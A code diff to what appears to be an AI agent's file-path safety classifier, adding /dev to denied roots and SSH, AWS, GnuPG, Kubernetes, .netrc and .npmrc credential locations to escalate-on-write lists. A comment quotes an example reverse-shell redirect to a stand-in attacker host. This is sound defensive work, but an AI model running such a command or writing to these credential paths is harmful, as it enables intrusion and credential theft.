@@ -47,15 +47,52 @@ export interface ProtectedClassifyInput {
 // path classifies as `deny` when it equals one of these or descends
 // from one (`startsWithSegment` semantics — `/proc` matches `/proc/`
 // or `/proc/foo` but not `/procfoo`).
-const SYSTEM_DENY_ROOTS: readonly string[] = ['/proc', '/sys', '/boot'];
+//
+// `/dev` (slice 97, R2 finding #12): device nodes are kernel-managed
+// like /proc and /sys. An LLM-driven write to `/dev/sda` would
+// overwrite a raw disk; `cat /dev/tcp/attacker/80 > shell` is the
+// canonical reverse-shell-via-redirect shape. Reads of `/dev/random`
+// or `/dev/zero` are legitimate but rare; refusing them outright
+// pushes operators to explicitly invoke a non-LLM tool, which is
+// the safer default for kernel-managed pseudofs.
+const SYSTEM_DENY_ROOTS: readonly string[] = ['/proc', '/sys', '/boot', '/dev'];
 
 // Tilde-rooted files that escalate on write. Each entry is resolved
 // against the operator's `$HOME` at classification time. We list the
 // canonical shell rc files plus the agent's own config dirs so the
 // model can't quietly amend the policy via `write_file`.
-const TILDE_ESCALATE_FILES: readonly string[] = ['.bashrc', '.zshrc', '.profile', '.bash_profile'];
+//
+// `.netrc` / `.npmrc` (slice 97, R2 P1 finding): per-protocol
+// credential files (`.netrc` for FTP/HTTP, `.npmrc` for the npm
+// registry). Operator writes to these are legitimate during account
+// setup but rare during agent work; escalating on write defends
+// against silent credential injection by a hostile agent definition.
+const TILDE_ESCALATE_FILES: readonly string[] = [
+  '.bashrc',
+  '.zshrc',
+  '.profile',
+  '.bash_profile',
+  '.netrc',
+  '.npmrc',
+];
 
-const TILDE_ESCALATE_DIRS: readonly string[] = ['.config/agent', '.config/claude'];
+// `.ssh`, `.aws`, `.gnupg`, `.kube` (slice 97, R2 P1 finding):
+// per-service credential trees. Writing any file under them admits
+// silent key/credential injection (`.ssh/authorized_keys`,
+// `.aws/credentials`, `.gnupg/private-keys-v1.d/`, `.kube/config`).
+// Reads pass through — agents legitimately enumerate `.kube/config`
+// to know which cluster they're targeting — but writes always
+// escalate. Adding these to the dir list (vs the file list) means
+// the classifier matches `.ssh/known_hosts` AND `.ssh/foo/bar`
+// alike via `startsWithSegment`.
+const TILDE_ESCALATE_DIRS: readonly string[] = [
+  '.config/agent',
+  '.config/claude',
+  '.ssh',
+  '.aws',
+  '.gnupg',
+  '.kube',
+];
 
 // Absolute roots that escalate on write regardless of cwd or home.
 const ABSOLUTE_ESCALATE_ROOTS: readonly string[] = ['/etc'];
